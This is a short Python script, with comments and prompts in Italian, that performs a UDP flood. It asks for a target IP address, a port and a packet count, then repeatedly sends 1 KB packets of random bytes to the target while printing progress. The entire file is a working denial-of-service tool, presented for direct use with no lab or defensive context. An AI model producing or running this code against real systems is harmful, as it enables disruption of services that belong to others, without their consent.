import socket
import random
import time

def generate_packet(size):
    """Genera un pacchetto di dati casuali della dimensione specificata."""
    return bytes([random.randint(0, 255) for _ in range(size)])

def udp_flood(target_ip, target_port, packet_size, number_of_packets):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = generate_packet(packet_size)  # Genera un pacchetto di 1 KB

    print(f"Iniziando l'UDP flood su {target_ip}:{target_port} con pacchetti di {packet_size} byte per {number_of_packets} pacchetti...")

    sent_packets = 0
    while sent_packets < number_of_packets:
        try:
            client.sendto(message, (target_ip, target_port))
            sent_packets += 1
            print(f"Pacchetto {sent_packets}/{number_of_packets} inviato.")
        except Exception as e:
            print(f"Errore durante l'invio del pacchetto: {e}")
            break

    print("UDP flood terminato.")

# Richiei input all'utente
target_ip = input("Inserisci l'indirizzo IP della macchina target: ")
target_port = int(input("Inserisci la porta target: "))
packet_size = 1024  # 1 KB in byte
number_of_packets = int(input("Inserisci il numero di pacchetti da inviare: "))

udp_flood(target_ip, target_port, packet_size, number_of_packets)

